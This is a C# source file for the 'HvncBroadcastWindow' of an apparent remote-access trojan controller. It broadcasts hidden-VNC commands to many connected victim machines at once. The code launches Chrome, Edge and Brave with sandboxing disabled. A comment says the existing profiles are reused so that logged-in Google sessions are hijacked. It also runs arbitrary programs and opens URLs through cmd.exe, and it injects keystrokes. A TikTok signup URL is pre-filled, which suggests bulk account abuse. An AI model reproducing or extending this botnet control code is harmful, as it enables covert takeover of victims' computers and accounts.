using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Input;
using Newtonsoft.Json;
using SeroServer.Data;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class HvncBroadcastWindow : Window
{
    private readonly TlsServer _server;
    private readonly ObservableCollection<BroadcastClientVM> _clients = [];
    private bool _maximized;

    // App entries — same as HvncWindow but without custom user-data-dir on default browser
    // so the existing profile (with Google logged in) is used automatically.
    private static readonly (string Label, string Cmd)[] AppEntries =
    [
        ("Explorer",     "explorer.exe"),
        ("Chrome (existing profile)",
                         @"%ProgramFiles%\Google\Chrome\Application\chrome.exe --no-sandbox --allow-no-sandbox-job --disable-gpu"),
        ("Chrome (fresh)",
                         @"%ProgramFiles%\Google\Chrome\Application\chrome.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --user-data-dir=%TEMP%\hvnc_chrome"),
        ("Edge (existing profile)",
                         @"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized"),
        ("Edge (fresh)",
                         @"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --user-data-dir=%TEMP%\hvnc_edge"),
        ("Firefox",      @"%ProgramFiles%\Mozilla Firefox\firefox.exe -profile %TEMP%\hvnc_ff -no-remote -width 1280 -height 720"),
        ("Brave",        @"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --user-data-dir=%TEMP%\hvnc_brave"),
    ];

    public HvncBroadcastWindow(TlsServer server)
    {
        InitializeComponent();
        _server = server;

        ClientList.ItemsSource = _clients;
        foreach (var (label, _) in AppEntries)
            CmbApp.Items.Add(label);
        CmbApp.SelectedIndex = 0;

        // TikTok shortcut pre-fill
        TxtUrl.Text = "https://www.tiktok.com/signup";

        RefreshClients();

        // Track connects/disconnects
        _server.ClientConnected    += _ => Dispatcher.BeginInvoke(RefreshClients);
        _server.ClientDisconnected += _ => Dispatcher.BeginInvoke(RefreshClients);
        Closed += (_, _) =>
        {
            _server.ClientConnected    -= _ => Dispatcher.BeginInvoke(RefreshClients);
            _server.ClientDisconnected -= _ => Dispatcher.BeginInvoke(RefreshClients);
        };
    }

    private void RefreshClients()
    {
        var existing = _clients.ToDictionary(c => c.ClientId);
        var online   = _server.ConnectedClients.Values.ToList();

        // Remove disconnected
        foreach (var old in _clients.Where(c => !online.Any(o => o.Id == c.ClientId)).ToList())
            _clients.Remove(old);

        // Add new
        foreach (var c in online.Where(o => !existing.ContainsKey(o.Id)))
            _clients.Add(new BroadcastClientVM(c.Id, $"{c.Id}  [{c.MachineName}]"));

        UpdateCount();
    }

    private IEnumerable<string> SelectedIds =>
        _clients.Where(c => c.Selected).Select(c => c.ClientId);

    private void UpdateCount()
    {
        int sel = _clients.Count(c => c.Selected);
        TxtCount.Text = $"  —  {sel}/{_clients.Count} selected";
    }

    // ── Broadcast helpers ─────────────────────────────────────────────────────

    private async Task SendExecToAll(string cmd)
    {
        var ids = SelectedIds.ToList();
        if (ids.Count == 0) { TxtStatus.Text = "No clients selected."; return; }

        int sent = 0;
        foreach (var id in ids)
        {
            await _server.SendToClient(id, new Packet
            {
                Type = PacketType.HvncExec,
                Data = JsonConvert.SerializeObject(new HvncExecData { Path = cmd })
            });
            sent++;
        }
        AddLog($"[▶] Launched on {sent} client(s): {cmd[..Math.Min(cmd.Length, 60)]}");
        TxtStatus.Text = $"Sent to {sent} client(s)";
    }

    private async Task SendKeyToAll(int vk, bool ctrl = false, bool shift = false, bool alt = false)
    {
        var ids = SelectedIds.ToList();
        if (ids.Count == 0) { TxtStatus.Text = "No clients selected."; return; }

        // Send modifier down
        async Task ModDown(int mvk) =>
            await BroadcastInput(ids, new HvncInputData { T = "kd", VK = mvk });

        async Task Key(int k) =>
            await BroadcastInput(ids, new HvncInputData { T = "kd", VK = k });

        async Task KeyUp(int k) =>
            await BroadcastInput(ids, new HvncInputData { T = "ku", VK = k });

        if (ctrl)  await ModDown(0x11);
        if (shift) await ModDown(0x10);
        if (alt)   await ModDown(0x12);
        await Key(vk);
        await KeyUp(vk);
        if (ctrl)  await KeyUp(0x11);
        if (shift) await KeyUp(0x10);
        if (alt)   await KeyUp(0x12);

        AddLog($"[⌨] Key VK={vk:X2} sent to {ids.Count} client(s)");
    }

    private async Task BroadcastInput(List<string> ids, HvncInputData inp)
    {
        var pkt = new Packet
        {
            Type = PacketType.HvncInput,
            Data = JsonConvert.SerializeObject(inp)
        };
        foreach (var id in ids)
            await _server.SendToClient(id, pkt);
    }

    // ── Button handlers ───────────────────────────────────────────────────────

    private async void BtnLaunch_Click(object s, RoutedEventArgs e)
    {
        int idx = CmbApp.SelectedIndex;
        if (idx < 0 || idx >= AppEntries.Length) return;
        await SendExecToAll(AppEntries[idx].Cmd);
    }

    private async void BtnExec_Click(object s, RoutedEventArgs e)
    {
        var path = TxtCustomPath.Text.Trim();
        if (!string.IsNullOrEmpty(path)) await SendExecToAll(path);
    }

    private async void BtnOpenUrl_Click(object s, RoutedEventArgs e)
    {
        var url = TxtUrl.Text.Trim();
        if (string.IsNullOrEmpty(url)) return;
        // Open via default browser shortcut: start "" "url"
        await SendExecToAll($@"cmd.exe /c start """" ""{url}""");
        AddLog($"[🌐] URL opened on {SelectedIds.Count()} client(s): {url}");
    }

    private async void BtnKey_Click(object s, RoutedEventArgs e)
    {
        if (s is not System.Windows.Controls.Button btn) return;
        var tag = btn.Tag?.ToString() ?? "";
        switch (tag)
        {
            case "Ctrl+A": await SendKeyToAll(0x41, ctrl: true); break;
            case "Ctrl+C": await SendKeyToAll(0x43, ctrl: true); break;
            case "Ctrl+V": await SendKeyToAll(0x56, ctrl: true); break;
            case "Enter":  await SendKeyToAll(0x0D); break;
            case "Escape": await SendKeyToAll(0x1B); break;
            case "Tab":    await SendKeyToAll(0x09); break;
            case "F5":     await SendKeyToAll(0x74); break;
        }
        TxtStatus.Text = $"Key '{tag}' sent to {SelectedIds.Count()} client(s)";
    }

    private void BtnSelectAll_Click(object s, RoutedEventArgs e)
    {
        foreach (var c in _clients) c.Selected = true;
        UpdateCount();
    }

    private void BtnSelectNone_Click(object s, RoutedEventArgs e)
    {
        foreach (var c in _clients) c.Selected = false;
        UpdateCount();
    }

    private void Client_CheckChanged(object s, RoutedEventArgs e) => UpdateCount();

    private void BtnClearLog_Click(object s, RoutedEventArgs e) => TxtLog.Clear();

    private void AddLog(string msg)
    {
        TxtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
        LogScroll.ScrollToEnd();
    }

    private void BtnMax_Click(object s, RoutedEventArgs e)
    {
        _maximized = !_maximized;
        WindowState = _maximized ? WindowState.Maximized : WindowState.Normal;
        RootBorder.CornerRadius = _maximized ? new CornerRadius(0) : new CornerRadius(8);
        BtnMax.Content = _maximized ? "❐" : "☐";
    }

    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && WindowState != WindowState.Maximized)
            DragMove();
    }
    private void Close_Click(object s, RoutedEventArgs e) => Close();
}

public class BroadcastClientVM : INotifyPropertyChanged
{
    public event PropertyChangedEventHandler? PropertyChanged;
    private void Notify([CallerMemberName] string? p = null)
        => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(p));

    public string ClientId { get; }
    public string Label    { get; }

    private bool _selected = true;
    public bool Selected
    {
        get => _selected;
        set { if (_selected != value) { _selected = value; Notify(); } }
    }

    public BroadcastClientVM(string id, string label) { ClientId = id; Label = label; }
}
